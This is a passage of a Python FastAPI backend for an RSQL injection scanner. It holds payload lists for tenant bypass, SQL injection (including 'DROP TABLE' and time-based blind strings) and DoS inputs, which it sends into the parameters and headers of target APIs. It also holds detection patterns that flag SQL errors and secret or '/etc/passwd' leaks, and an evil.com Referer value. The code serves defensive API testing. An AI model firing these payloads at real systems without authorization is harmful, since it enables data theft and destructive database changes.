"""
RSQL Security Tester Backend — Port 8774
Ported from API_RSQL_Security_Test.py
Tests body params, query params and custom headers for RSQL injection vulnerabilities.
"""

import json, csv, re, time, uuid, threading, io
from urllib.parse import urlparse, urlencode, parse_qs, quote
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse
from pydantic import BaseModel
from typing import List, Optional, Any
import urllib3

try:
    import requests as req_lib
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    req_lib = None

app = FastAPI(title="RSQL Security Tester Backend")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

TIMEOUT    = 10
VERIFY_SSL = False
jobs = {}

# null byte defined here so the source file never contains an actual \x00
_NUL = chr(0)

# ── RSQL Attack Datasets ──────────────────────────────────────────────────────

RSQL_DATASETS = {
    "rsql_basic_operators": {
        "label": "Basic Operators",
        "hint":  "==, !=, =lt=, =gt=, =le=, =ge=, =in=, =out= injected into field values",
        "icon":  "⚖️",
        "cases": [
            ("NEG","eq_operator",         "Equality operator ==",          "name==admin"),
            ("NEG","neq_operator",        "Not-equal operator !=",         "status!=ACTIVE"),
            ("NEG","lt_operator",         "Less-than =lt=",                "age=lt=100"),
            ("NEG","gt_operator",         "Greater-than =gt=",             "id=gt=0"),
            ("NEG","le_operator",         "Less-or-equal =le=",            "salary=le=999999"),
            ("NEG","ge_operator",         "Greater-or-equal =ge=",         "legalEntityId=ge=1"),
            ("NEG","in_operator_single",  "=in= single value",             "role=in=(admin)"),
            ("NEG","in_operator_multi",   "=in= multiple values",          "role=in=(admin,superuser,root)"),
            ("NEG","out_operator",        "=out= exclusion",               "status=out=(INACTIVE,DELETED)"),
            ("NEG","eq_wildcard_star",    "== with wildcard *",            "name==*"),
            ("NEG","eq_empty",            "== empty string match",         "periodName=="),
            ("NEG","neq_empty",           "!= empty",                      "periodName!="),
            ("NEG","gt_zero",             "=gt= 0",                        "legalEntityId=gt=0"),
            ("NEG","lt_huge",             "=lt= huge value",               "id=lt=999999999"),
            ("NEG","in_special_chars",    "=in= with special chars",       "name=in=(*,admin,%)"),
            ("NEG","eq_null_literal",     "== null literal",               "anchorDate==null"),
            ("NEG","neq_null_literal",    "!= null",                       "anchorDate!=null"),
        ],
    },
    "rsql_wildcard": {
        "label": "Wildcard Patterns",
        "hint":  "Glob / wildcard chars that match all or partial records",
        "icon":  "🌟",
        "cases": [
            ("NEG","star_only",           "Bare star wildcard",            "*"),
            ("NEG","star_prefix",         "Star prefix (ends-with)",       "*admin"),
            ("NEG","star_suffix",         "Star suffix (starts-with)",     "admin*"),
            ("NEG","double_star",         "Double star",                   "**"),
            ("NEG","star_in_eq",          "Star inside == expression",     "name==admin*"),
            ("NEG","question_mark",       "? single-char wildcard",        "name==admi?"),
            ("NEG","percent_sql_wild",    "SQL % wildcard",                "name==%"),
            ("NEG","underscore_sql_wild", "SQL _ wildcard",                "name==_"),
            ("NEG","percent_suffix",      "% suffix",                      "period%"),
            ("NEG","star_between",        "Star between words",            "Period*Name"),
            ("NEG","regex_dot_star",      "Regex .* pattern",              "name==.*"),
            ("NEG","glob_brackets",       "Glob bracket pattern",          "name==[aA]*"),
            ("NEG","glob_negation",       "Glob negation pattern",         "name==[^a]*"),
        ],
    },
    "rsql_logic_chain": {
        "label": "Logic Chain (AND/OR)",
        "hint":  "Semicolon(AND) and comma(OR) logic to chain extra filters",
        "icon":  "🔗",
        "cases": [
            ("NEG","and_chain_basic",     "Basic AND chain (;)",           "MONTHLY;role==admin"),
            ("NEG","or_chain_basic",      "Basic OR chain (,)",            "MONTHLY,WEEKLY"),
            ("NEG","and_always_true",     "AND tautology",                 "MONTHLY;id=gt=0"),
            ("NEG","or_always_true",      "OR tautology",                  "x==x,y==y"),
            ("NEG","chained_ors",         "Multiple ORs",                  "a,b,c,d,e"),
            ("NEG","and_to_bypass_tenant","AND to inject tenant filter",   "MONTHLY;customerId==1"),
            ("NEG","and_to_inject_id",    "AND to inject ID filter",       "MONTHLY;legalEntityId==175"),
            ("NEG","or_extend_roles",     "OR to extend allowed roles",    "FULL_TIME,PART_TIME,CONTRACTOR"),
            ("NEG","and_with_null",       "AND with null check",           "MONTHLY;anchorDate==null"),
            ("NEG","semicolon_prefix",    "Semicolon at start",            ";id=gt=0"),
            ("NEG","semicolon_suffix",    "Semicolon at end",              "MONTHLY;"),
            ("NEG","comma_prefix",        "Comma at start",                ",WEEKLY"),
            ("NEG","chained_mixed",       "Mixed AND/OR chain",            "a;b,c;d==e"),
            ("NEG","and_status_override", "AND to override status",        "MONTHLY;status==ACTIVE"),
            ("NEG","deeply_chained",      "Long AND chain",                "a;b;c;d;e;f;g;h==x"),
        ],
    },
    "rsql_nested_filter": {
        "label": "Nested Expressions",
        "hint":  "Parenthesised compound expressions to override filter logic",
        "icon":  "🧩",
        "cases": [
            ("NEG","paren_basic",         "Basic parenthesis grouping",    "(name==admin)"),
            ("NEG","paren_or_group",      "OR inside parens",              "(a==x,b==y)"),
            ("NEG","paren_and_group",     "AND inside parens",             "(a==x;b==y)"),
            ("NEG","nested_parens",       "Nested parentheses",            "((a==x,b==y);c==z)"),
            ("NEG","paren_tautology",     "Parenthesised tautology",       "(id=gt=0)"),
            ("NEG","paren_always_true",   "Always-true compound",          "(x==x,y==y);z=gt=0"),
            ("NEG","paren_bypass_tenant", "Paren bypass with tenantId",    "(customerId==1,customerId==2)"),
            ("NEG","paren_empty",         "Empty parentheses",             "()"),
            ("NEG","paren_with_or_null",  "Paren OR null match",           "(name==*,name==null)"),
            ("NEG","deep_nesting",        "4-level nesting",               "((((a==b))))"),
            ("NEG","paren_then_and",      "Group then AND",                "(a==x),b==y;c==z"),
        ],
    },
    "rsql_selector_traversal": {
        "label": "Selector Traversal",
        "hint":  "Dot-notation field traversal to access related/nested objects",
        "icon":  "🔍",
        "cases": [
            ("NEG","dot_single",          "Single dot traversal",          "user.id==1"),
            ("NEG","dot_double",          "Double dot traversal",          "user.role.name==admin"),
            ("NEG","dot_triple",          "Triple dot traversal",          "a.b.c.d==x"),
            ("NEG","dot_password_field",  "Traverse to password field",    "user.password==*"),
            ("NEG","dot_token_field",     "Traverse to token field",       "user.token==*"),
            ("NEG","dot_deleted_flag",    "Traverse to isDeleted flag",    "user.isDeleted==false"),
            ("NEG","dot_role_traversal",  "Role via dot notation",         "employee.role==ADMIN"),
            ("NEG","dot_tenant_id",       "Tenant via dot notation",       "org.customerId==1"),
            ("NEG","dot_with_wildcard",   "Dot + wildcard combo",          "a.b==*"),
            ("NEG","bracket_notation",    "Bracket-style traversal",       "user[id]==1"),
            ("NEG","dot_in_value",        "Dot-path in value position",    "user.id=in=(1,2,3)"),
            ("NEG","nested_filter_escape","Escape into nested object",     "address.country==IN"),
        ],
    },
    "rsql_boolean_bypass": {
        "label": "Boolean / Null Bypass",
        "hint":  "Null, true, false as filter values to reveal hidden records",
        "icon":  "🔀",
        "cases": [
            ("NEG","true_literal",        "Bare true literal",             "true"),
            ("NEG","false_literal",       "Bare false literal",            "false"),
            ("NEG","null_literal",        "Bare null literal",             "null"),
            ("NEG","eq_true",             "Field == true",                 "isActive==true"),
            ("NEG","eq_false",            "Field == false",                "isDeleted==false"),
            ("NEG","eq_null",             "Field == null",                 "deletedAt==null"),
            ("NEG","neq_false",           "Field != false (all active)",   "isActive!=false"),
            ("NEG","neq_null",            "Field != null (has value)",     "deletedAt!=null"),
            ("NEG","in_booleans",         "=in= boolean list",             "active=in=(true,false)"),
            ("NEG","null_in_in_list",     "null inside =in= list",         "field=in=(null,admin)"),
            ("NEG","null_with_and",       "null chained with AND",         "null;id=gt=0"),
            ("NEG","boolean_string",      "Boolean as string",             '"true"'),
            ("NEG","one_as_true",         "Integer 1 as truthy",           "active==1"),
            ("NEG","zero_as_false",       "Integer 0 as falsy",            "active==0"),
        ],
    },
    "rsql_numeric_boundary": {
        "label": "Numeric Boundary",
        "hint":  "Extreme numbers to reach max rows or bypass ID restrictions",
        "icon":  "🔢",
        "cases": [
            ("NEG","gt_minus_one",        "=gt= -1 (all records)",         "id=gt=-1"),
            ("NEG","ge_zero",             "=ge= 0 (all records)",          "id=ge=0"),
            ("NEG","lt_max_int",          "=lt= max int",                  "id=lt=2147483647"),
            ("NEG","le_max_int",          "=le= max int",                  "id=le=2147483647"),
            ("NEG","eq_max_int",          "== max int",                    "id==2147483647"),
            ("NEG","eq_zero",             "== 0 (null ID rows)",           "id==0"),
            ("NEG","eq_negative",         "== negative ID",                "id==-1"),
            ("NEG","in_range_ids",        "=in= ID list",                  "id=in=(1,2,3,4,5)"),
            ("NEG","gt_float",            "=gt= float boundary",           "salary=gt=0.0"),
            ("NEG","le_float_small",      "=le= near-zero float",          "salary=le=0.001"),
            ("NEG","eq_sci_notation",     "Scientific notation value",     "amount==1e10"),
            ("NEG","huge_page_size",      "Huge page size filter",         "pageSize=gt=99999"),
            ("NEG","in_sequential_ids",   "Sequential IDs in =in=",        "id=in=(1,2,3,4,5,6,7,8,9,10)"),
        ],
    },
    "rsql_sqli_hybrid": {
        "label": "SQL Injection Hybrid",
        "hint":  "SQL injection payloads smuggled through RSQL syntax",
        "icon":  "💉",
        "cases": [
            ("NEG","sqli_tautology",      "Classic SQL tautology",         "' OR '1'='1"),
            ("NEG","sqli_comment_dash",   "SQL -- comment",                "admin'--"),
            ("NEG","sqli_comment_hash",   "SQL # comment",                 "admin'#"),
            ("NEG","sqli_union_basic",    "UNION SELECT",                  "' UNION SELECT 1,2,3--"),
            ("NEG","sqli_sleep",          "SQL SLEEP() function",          "' OR SLEEP(5)--"),
            ("NEG","sqli_waitfor",        "WAITFOR DELAY (MSSQL)",         "'; WAITFOR DELAY '0:0:5'--"),
            ("NEG","sqli_benchmark",      "BENCHMARK function",            "' OR BENCHMARK(1000000,MD5('a'))--"),
            ("NEG","sqli_drop_table",     "DROP TABLE payload",            "'; DROP TABLE users--"),
            ("NEG","sqli_stacked",        "Stacked queries",               "'; SELECT * FROM users--"),
            ("NEG","sqli_in_rsql_eq",     "SQLi inside == value",          "name==' OR 1=1--"),
            ("NEG","sqli_in_rsql_in",     "SQLi inside =in= list",         "name=in=(' OR 1=1--)"),
            ("NEG","sqli_xor_boolean",    "XOR boolean blind",             "1 XOR(if(now()=sysdate(),sleep(5),0))--"),
            ("NEG","sqli_double_quote",   "Double-quote escape",           '" OR "1"="1'),
            ("NEG","sqli_hex_encoding",   "Hex-encoded payload",           "0x61646d696e"),
            ("NEG","sqli_char_func",      "CHAR() function",               "' OR CHAR(97)=CHAR(97)--"),
            ("NEG","sqli_time_based",     "Time-based blind",              "1' AND SLEEP(3)--"),
        ],
    },
    "rsql_escape_sequences": {
        "label": "Escape Sequences",
        "hint":  "Quote escape, backslash, URL encoding, unicode tricks",
        "icon":  "🔤",
        "cases": [
            ("NEG","single_quote",        "Single quote",                  "'"),
            ("NEG","double_quote",        "Double quote",                  '"'),
            ("NEG","backslash",           "Backslash",                     "\\"),
            ("NEG","escaped_quote",       "Escaped single quote",          "\\'"),
            ("NEG","escaped_double",      "Escaped double quote",          '\\"'),
            ("NEG","url_encoded_eq",      "URL-encoded == (%3D%3D)",       "name%3D%3Dadmin"),
            ("NEG","url_encoded_semi",    "URL-encoded ; (%3B)",           "MONTHLY%3Bid=gt=0"),
            ("NEG","url_encoded_paren",   "URL-encoded parens (%28%29)",   "%28name==admin%29"),
            ("NEG","double_url_encoded",  "Double URL-encoded",            "name%253D%253Dadmin"),
            ("NEG","unicode_eq",          "Unicode full-width ==",         "name＝＝admin"),
            ("NEG","unicode_semi",        "Unicode full-width ;",          "MONTHLY；id=gt=0"),
            ("NEG","null_byte",           "Null byte injection",           "MONTHLY\x00;id=gt=0"),
            ("NEG","newline_injection",   "Newline injection",             "MONTHLY\nid=gt=0"),
            ("NEG","tab_injection",       "Tab injection",                 "MONTHLY\tid=gt=0"),
            ("NEG","carriage_return",     "CR injection",                  "MONTHLY\rid=gt=0"),
            ("NEG","unicode_null",        "Unicode null char",             "MONTHLY" + _NUL + "admin"),
            ("NEG","html_entity_eq",      "HTML entity &amp;=",            "name&amp;==admin"),
        ],
    },
    "rsql_auth_bypass": {
        "label": "Auth / Tenant Bypass",
        "hint":  "Payloads targeting multi-tenant isolation and access controls",
        "icon":  "🔐",
        "cases": [
            ("NEG","customer_id_inject",  "Inject customerId filter",      "1;customerId==1"),
            ("NEG","customer_id_or",      "OR different customerId",       "1,customerId==2"),
            ("NEG","user_id_inject",      "Inject userId filter",          "1;userId==140466"),
            ("NEG","user_id_any",         "UserId == any record",          "userId=gt=0"),
            ("NEG","legal_entity_bypass", "Legal entity ID bypass",        "175;legalEntityId=gt=0"),
            ("NEG","role_escalation",     "Inject role filter",            "FULL_TIME;role==ADMIN"),
            ("NEG","role_in_any",         "Role in any list",              "role=in=(ADMIN,SUPERUSER,OWNER)"),
            ("NEG","org_id_traverse",     "Org ID dot traversal",          "org.id=gt=0"),
            ("NEG","division_bypass",     "Division filter bypass",        "1;division==59"),
            ("NEG","deleted_bypass",      "See deleted records",           "1;isDeleted==true"),
            ("NEG","inactive_bypass",     "See inactive records",          "1;isActive==false"),
            ("NEG","all_tenants",         "All tenants wildcard",          "customerId==*"),
            ("NEG","tenant_zero",         "Tenant ID == 0",                "customerId==0"),
            ("NEG","tenant_negative",     "Negative tenant ID",            "customerId==-1"),
            ("NEG","super_user_flag",     "superUser flag true",           "isSuperUser==true"),
        ],
    },
    "rsql_dos_patterns": {
        "label": "DoS Patterns",
        "hint":  "Payloads designed to exhaust server memory or CPU",
        "icon":  "💣",
        "cases": [
            ("NEG","very_long_value",     "Very long value (5000 chars)",  "A" * 5000),
            ("NEG","deep_nested_parens",  "Deep nested parens (50 levels)","(" * 50 + "x==y" + ")" * 50),
            ("NEG","huge_in_list",        "=in= list with 500 values",     "id=in=(" + ",".join(str(i) for i in range(500)) + ")"),
            ("NEG","repeated_and",        "100x AND chain",                ";".join(["x==y"] * 100)),
            ("NEG","repeated_or",         "100x OR chain",                 ",".join(["x==y"] * 100)),
            ("NEG","unicode_flood",       "Long unicode string",           "名前" * 500),
            ("NEG","whitespace_flood",    "Mass whitespace padding",       " " * 2000 + "admin" + " " * 2000),
            ("NEG","regex_like_payload",  "Regex-like catastrophic match", "a+" * 100),
            ("NEG","zero_length_filter",  "Zero-length value",             ""),
            ("NEG","max_int_page",        "Max-int page/limit param",      "id=in=(" + ",".join(str(i) for i in range(1000, 1100)) + ")"),
        ],
    },
    "rsql_header_injection": {
        "label": "Header Injection",
        "hint":  "RSQL payloads smuggled through custom headers (X-Filter, X-Query, etc.)",
        "icon":  "📋",
        "cases": [
            ("NEG","x_filter_basic",      "X-Filter: basic RSQL",          "id=gt=0"),
            ("NEG","x_query_basic",       "X-Query: basic filter",         "name==admin"),
            ("NEG","x_filter_tenant",     "X-Filter: tenant bypass",       "customerId==1"),
            ("NEG","x_sort_inject",       "X-Sort: inject extra sort",     "id,name;customerId"),
            ("NEG","x_fields_inject",     "X-Fields: field dump",          "*,password,token"),
            ("NEG","x_filter_wildcard",   "X-Filter: wildcard",            "name==*"),
            ("NEG","rsql_in_referer",     "RSQL in Referer header",        "https://evil.com?filter=id=gt=0"),
            ("NEG","rsql_in_useragent",   "RSQL in User-Agent header",     "Mozilla/5.0 (id=gt=0)"),
        ],
    },
}

_HEADER_MAP = {
    "x_filter_basic":    "X-Filter",
    "x_query_basic":     "X-Query",
    "x_filter_tenant":   "X-Filter",
    "x_sort_inject":     "X-Sort",
    "x_fields_inject":   "X-Fields",
    "x_filter_wildcard": "X-Filter",
    "rsql_in_referer":   "Referer",
    "rsql_in_useragent": "User-Agent",
}


# ── Helpers ───────────────────────────────────────────────────────────────────

def _clean_headers(hdrs):
    skip = {"accept-encoding", "content-length"}
    clean = {}
    for k, v in hdrs.items():
        if not isinstance(k, str) or not k.strip(): continue
        if k.startswith(":"): continue
        if k.lower() in skip: continue
        sv = str(v)
        if "\r" in sv or "\n" in sv: continue
        clean[k] = sv
    return clean


# FIQL grammar-only parser tokens — these are internal grammar symbols, not a real field-name leak
_FIQL_GRAMMAR_RE = re.compile(
    r"COMP_FIQL|COMP_ALT|FIQL_PARSER|RSQLParser"
    r"|Was expecting one of"
    r"|Encountered .{1,120} at line \d+, column \d+",
    re.IGNORECASE | re.DOTALL,
)

# Patterns that indicate an actual field/column name is disclosed in the error
_FIELD_EXPOSED_RE = re.compile(
    r"(unknown|invalid|unrecognized|no such|unsupported|illegal)\s+"
    r"(field|property|selector|attribute|column|node|key)\b"
    r"|\b(field|property|selector|attribute|column)\s*[\"\'`]\w"
    r"|\b(field|property)\s+[\w.]+\s+(not found|does not exist|is not valid|unknown)",
    re.IGNORECASE,
)

# Regex that strips JSON KEY occurrences of rsql/fiql
# e.g. "fiqlKey": ... "defaultFiql": ... "quickFilterFiql": ...
# These are field names the API uses internally — NOT vulnerability indicators.
# After stripping, if rsql/fiql still present it means it's in a VALUE (error msg etc.)
_JSON_KEY_RE = re.compile(r'"[^"]*(?:rsql|fiql)[^"]*"\s*:', re.IGNORECASE)

# SQL / DB error & schema disclosure in response body
_SQL_DISCLOSURE_PATTERNS = [
    "sql error", "sql exception", "sqlexception", "sqlstate",
    "sql syntax", "you have an error in your sql",
    "incorrect syntax near", "syntax error near",
    "unclosed quotation", "quoted string not properly terminated",
    "unterminated quoted string", "unterminated string literal",
    "unknown column", "invalid column", "no such column",
    "column doesn't exist", "column does not exist",
    "ambiguous column", "duplicate column name",
    "unknown table", "no such table", "invalid object name",
    "table doesn't exist", "table does not exist",
    "relation does not exist", "undefined table", "undefined column",
    "information_schema", "pg_catalog",
    "mysql_fetch", "mysqli_", "mysql error", "warning: mysql",
    "pg_query", "psycopg", "postgresql query failed",
    "sqlite3", "sqlite error", "sqliteexception",
    "ora-", "pls-", "oracle error",
    "odbc sql", "ole db", "microsoft.sqlserver",
    "jdbc", "hibernate exception", "django.db", "sqlalchemy",
    "com.mysql", "org.hibernate", "org.postgresql",
    "sqlcommand", "system.data.sqlclient",
]
_SQL_DISCLOSURE_RE = re.compile(
    "|".join(re.escape(p) for p in _SQL_DISCLOSURE_PATTERNS),
    re.IGNORECASE,
)

# Other sensitive error / leak signals (stack, path, secrets) — not RSQL/FIQL/SQL
_OTHER_LEAK_PATTERNS = [
    "stacktrace", "stack trace", "traceback (most recent call last)",
    "exception in thread", "nullpointerexception",
    "php warning", "php fatal", "php notice",
    "/var/www/", "/etc/passwd", "win.ini", "[boot loader]",
    "c:\\windows", "c:\\inetpub",
    "ldap error", "invaliddn",
    "aws_secret", "private_key", "secret_key",
    "root:x:0:0",
]
_OTHER_LEAK_RE = re.compile(
    "|".join(re.escape(p) for p in _OTHER_LEAK_PATTERNS),
    re.IGNORECASE,
)


def _detect_sql_or_leak(response_text: str):
    """Return 'sql' | 'leak' | None for non-RSQL disclosure signals."""
    if not response_text:
        return None
    if _SQL_DISCLOSURE_RE.search(response_text):
        return "sql"
    if _OTHER_LEAK_RE.search(response_text):
        return "leak"
    return None


def determine_result(status, response_text=""):
    """
    Returns (result, match_term) tuple.

    match_term values:
      "rsql"         — rsql found in error/value context
      "fiql"         — fiql found in error/value context (with field exposure)
      "fiql_grammar" — fiql found in FIQL grammar/parser error only
      "sql"          — SQL/DB error or schema disclosure in response
      "leak"         — stack trace / path / secret-style leak (non-SQL)
      None           — no relevant indicator found

    result values:
      VULN   — rsql/fiql/sql/leak disclosure in response
      WARN   — FIQL grammar error only, or server 5xx
      ERROR  — network/timeout error
      PASS   — everything else (including fiql/rsql only as JSON key names)
    """
    if status in ("ERROR", "TIMEOUT"):
        return "ERROR", None

    if response_text:
        has_rsql = bool(re.search(r"rsql", response_text, re.IGNORECASE))
        has_fiql = bool(re.search(r"fiql", response_text, re.IGNORECASE))

        if has_rsql or has_fiql:
            # Strip JSON key occurrences: "fiqlKey":, "defaultFiql":, "quickFilterFiql":
            # If term only appears as JSON field names → it's the API's own data, not an error
            stripped = _JSON_KEY_RE.sub("", response_text)
            val_rsql = bool(re.search(r"rsql", stripped, re.IGNORECASE))
            val_fiql = bool(re.search(r"fiql", stripped, re.IGNORECASE))

            if not val_rsql and not val_fiql:
                # rsql/fiql ONLY in JSON key names (e.g. "fiqlKey", "defaultFiql")
                # This is a normal API response — not a vulnerability
                pass  # fall through to SQL/leak / 5xx below
            else:
                # rsql/fiql appears in a response VALUE (error message, exception, etc.)
                is_grammar_only = (
                    val_fiql and not val_rsql
                    and _FIQL_GRAMMAR_RE.search(stripped)
                    and not _FIELD_EXPOSED_RE.search(stripped)
                )
                if is_grammar_only:
                    return "WARN", "fiql_grammar"
                term = "rsql" if val_rsql else "fiql"
                return "VULN", term

        # Broader disclosure: SQL errors, stack traces, path/secret leaks
        other = _detect_sql_or_leak(response_text)
        if other:
            return "VULN", other

    try:
        if int(status) >= 500:
            return "WARN", None
    except (TypeError, ValueError):
        pass
    return "PASS", None


def fire_single(session, method, url, headers, body, body_type, query, token, extra_headers=None):
    """Fire one request, return (status, response_text, elapsed_ms, request_body_str)."""
    import random as _r
    hdrs = _clean_headers(headers)
    if token:
        hdrs["Authorization"] = token

    # Refresh idempotency headers
    _idem = {"requestid","x-request-id","x-requestid","x-correlation-id",
             "idempotency-key","x-idempotency-key"}
    for k in list(hdrs.keys()):
        if k.lower() in _idem:
            hdrs[k] = str(_r.randint(10**15, 10**16 - 1))

    if extra_headers:
        hdrs.update(extra_headers)

    # Rebuild URL with query params
    parsed = urlparse(url)
    qs     = urlencode(query, quote_via=quote) if query else parsed.query
    url_r  = parsed._replace(query=qs).geturl()

    kw = {"headers": hdrs, "timeout": TIMEOUT, "verify": VERIFY_SSL}
    req_body_str = ""
    # Infer JSON when body is a dict/list but body_type was missing from import
    effective_type = body_type
    if not effective_type and isinstance(body, (dict, list)):
        effective_type = "json"
    if effective_type == "json" and isinstance(body, (dict, list)):
        kw["json"] = body
        try:
            req_body_str = json.dumps(body, indent=2, default=str)
        except Exception:
            req_body_str = str(body)
    elif effective_type in ("form", "raw") and body is not None:
        kw["data"] = body
        req_body_str = str(body)

    try:
        resp    = session.request(method, url_r, **kw)
        elapsed = int(resp.elapsed.total_seconds() * 1000)
        try:
            text = resp.text[:3000]
        except Exception:
            text = ""
        return resp.status_code, text, elapsed, req_body_str
    except req_lib.exceptions.Timeout:
        return "TIMEOUT", "", 0, req_body_str
    except Exception as e:
        return "ERROR", str(e)[:200], 0, req_body_str


# ── Nested JSON body path helpers (filter.rsql, changes[0].field) ─────────────

def _parse_nested_path(path):
    """Split 'changes[0].field' / 'a.b' into ['changes', 0, 'field']."""
    if not path:
        return []
    parts = []
    for m in re.finditer(r"\[(\d+)\]|([^.\[\]]+)", str(path)):
        if m.group(1) is not None:
            parts.append(int(m.group(1)))
        else:
            tok = m.group(2)
            parts.append(int(tok) if tok.isdigit() else tok)
    return parts


def _path_exists(root, dotted):
    """True if dotted/indexed path already exists on dict/list tree."""
    if root is None or not dotted or not isinstance(root, (dict, list)):
        return False
    # Plain top-level key
    if "." not in str(dotted) and "[" not in str(dotted):
        return isinstance(root, dict) and dotted in root
    parts = _parse_nested_path(dotted)
    if not parts:
        return False
    node = root
    for p in parts:
        if isinstance(p, int):
            if not isinstance(node, list) or p < 0 or p >= len(node):
                return False
            node = node[p]
        else:
            if not isinstance(node, dict) or p not in node:
                return False
            node = node[p]
    return True


def _set_nested_value(root, dotted, value):
    """Set dotted/indexed path on a dict/list tree. Returns True if set."""
    from copy import deepcopy
    if root is None or not dotted or not isinstance(root, (dict, list)):
        return False
    parts = _parse_nested_path(dotted)
    if not parts:
        return False
    node = root
    for p in parts[:-1]:
        if isinstance(p, int):
            if not isinstance(node, list) or p < 0 or p >= len(node):
                return False
            cur = node[p]
            if isinstance(cur, (dict, list)):
                node[p] = deepcopy(cur)
            node = node[p]
        else:
            if not isinstance(node, dict) or p not in node:
                return False
            cur = node[p]
            if isinstance(cur, (dict, list)):
                node[p] = deepcopy(cur)
            node = node[p]
    last = parts[-1]
    if isinstance(last, int):
        if not isinstance(node, list) or last < 0 or last >= len(node):
            return False
        node[last] = value
    else:
        if not isinstance(node, dict):
            return False
        node[last] = value
    return True


# ── Test plan builder ─────────────────────────────────────────────────────────

def build_test_plan(body_fields, query_fields, inject_headers, categories):
    plan = []
    for cat_key in categories:
        ds = RSQL_DATASETS.get(cat_key)
        if not ds:
            continue
        is_hdr_cat = (cat_key == "rsql_header_injection")

        # Body injections
        for field in body_fields:
            for _, case_id, case_desc, payload in ds["cases"]:
                if is_hdr_cat:
                    continue
                plan.append({
                    "inject_type": "body",
                    "field":       field,
                    "header_name": None,
                    "category":    ds["label"],
                    "cat_key":     cat_key,
                    "case_id":     case_id,
                    "case_desc":   case_desc,
                    "test_value":  payload,
                })

        # Query injections
        for field in query_fields:
            for _, case_id, case_desc, payload in ds["cases"]:
                if is_hdr_cat:
                    continue
                plan.append({
                    "inject_type": "query",
                    "field":       field,
                    "header_name": None,
                    "category":    ds["label"],
                    "cat_key":     cat_key,
                    "case_id":     case_id,
                    "case_desc":   case_desc,
                    "test_value":  payload,
                })

        # Header injections
        if inject_headers:
            if is_hdr_cat:
                for _, case_id, case_desc, payload in ds["cases"]:
                    hdr_name = _HEADER_MAP.get(case_id, "X-Filter")
                    plan.append({
                        "inject_type": "header",
                        "field":       hdr_name,
                        "header_name": hdr_name,
                        "category":    ds["label"],
                        "cat_key":     cat_key,
                        "case_id":     case_id,
                        "case_desc":   case_desc,
                        "test_value":  payload,
                    })
            else:
                # Non-header categories → also inject into X-Filter
                for _, case_id, case_desc, payload in ds["cases"]:
                    plan.append({
                        "inject_type": "header",
                        "field":       "X-Filter",
                        "header_name": "X-Filter",
                        "category":    ds["label"],
                        "cat_key":     cat_key,
                        "case_id":     case_id,
                        "case_desc":   case_desc,
                        "test_value":  payload,
                    })
    return plan


# ── Background scan runner ────────────────────────────────────────────────────

def _run_scan(job_id, entries, token, body_fields, query_fields, inject_headers, categories,
              delay_sec=0.0):
    import requests as _req
    from copy import deepcopy
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

    job = jobs[job_id]
    t0  = time.time()
    delay_sec = max(0.0, float(delay_sec or 0))

    s = _req.Session()
    r = Retry(total=2, backoff_factor=0.3, status_forcelist=[502, 503])
    s.mount("http://",  HTTPAdapter(max_retries=r))
    s.mount("https://", HTTPAdapter(max_retries=r))

    plan = build_test_plan(body_fields, query_fields, inject_headers, categories)
    grand_total = len(plan) * len(entries)
    job["total"] = grand_total

    results   = []
    completed = 0
    pass_n = vuln_n = warn_n = err_n = 0

    for entry in entries:
        e_method     = entry.get("method", "GET").upper()
        e_url        = entry.get("url", "")
        e_headers    = dict(entry.get("headers", {}))
        e_body       = entry.get("body")
        e_body_type  = entry.get("body_type")
        e_query      = dict(entry.get("query", {}))

        if not e_url.startswith("http"):
            grand_total -= len(plan)
            job["total"] = grand_total
            continue

        for test in plan:
            if job.get("stopped"):
                break

            # Only mutate one selected field at a time; keep every other
            # original body/query value exactly as captured.
            cur_body    = deepcopy(e_body) if e_body is not None else None
            cur_query   = dict(e_query)
            cur_body_type = e_body_type
            extra_hdrs  = None
            req_body_str = ""

            if test["inject_type"] == "body":
                field = test["field"]
                # Skip if this request has no such body field (union-selected
                # params from other APIs must not invent a one-key body).
                if not _path_exists(cur_body, field):
                    grand_total = max(0, grand_total - 1)
                    job["total"] = grand_total
                    continue
                if "." in str(field) or "[" in str(field):
                    _set_nested_value(cur_body, field, test["test_value"])
                elif isinstance(cur_body, dict):
                    cur_body[field] = test["test_value"]
                if not cur_body_type and isinstance(cur_body, (dict, list)):
                    cur_body_type = "json"
                req_body_str = (
                    json.dumps(cur_body, indent=2, default=str)
                    if isinstance(cur_body, (dict, list))
                    else str(cur_body)
                )

            elif test["inject_type"] == "query":
                field = test["field"]
                # Skip if this URL never had that query key
                if field not in cur_query:
                    grand_total = max(0, grand_total - 1)
                    job["total"] = grand_total
                    continue
                cur_query[field] = str(test["test_value"])
                # Show full query (mutated key highlighted by value)
                try:
                    req_body_str = "?" + urlencode(cur_query, quote_via=quote)
                except Exception:
                    req_body_str = f"[Query: {field}={test['test_value']}]"

            elif test["inject_type"] == "header":
                extra_hdrs   = {test["header_name"]: str(test["test_value"])}
                req_body_str = f"[Header: {test['header_name']}: {test['test_value']}]"

            status, resp_text, elapsed, rbs = fire_single(
                s, e_method, e_url, e_headers, cur_body, cur_body_type,
                cur_query, token, extra_hdrs
            )
            # Prefer full JSON body from fire_single; keep our query string for query inject
            if rbs and test["inject_type"] == "body":
                req_body_str = rbs
            elif rbs and test["inject_type"] == "header":
                req_body_str = rbs

            result, match_term = determine_result(status, resp_text)
            completed += 1

            if   result == "PASS":  pass_n += 1
            elif result == "VULN":  vuln_n += 1
            elif result == "WARN":  warn_n += 1
            else:                   err_n  += 1

            results.append({
                "api_url":      e_url,
                "inject_type":  test["inject_type"],
                "field":        test["field"],
                "category":     test["category"],
                "case_id":      test["case_id"],
                "case_desc":    test["case_desc"],
                "test_value":   str(test["test_value"])[:200],
                "status_code":  status,
                "result":       result,
                "match_term":   match_term,
                "elapsed_ms":   elapsed,
                "request_body": req_body_str[:800],
                "response":     resp_text,
            })

            job["results"]   = results[-200:]  # keep last 200 for light progress payload
            job["_all_results"] = results      # full list for live Results streaming
            job["all_results_count"] = len(results)
            job["completed"] = completed
            job["elapsed"]   = round(time.time() - t0, 1)
            job["progress"]  = int(completed / grand_total * 100) if grand_total else 100
            job["pass_n"]    = pass_n
            job["vuln_n"]    = vuln_n
            job["warn_n"]    = warn_n
            job["err_n"]     = err_n

            # Interruptible delay (Abort can land mid-wait)
            if delay_sec > 0 and not job.get("stopped"):
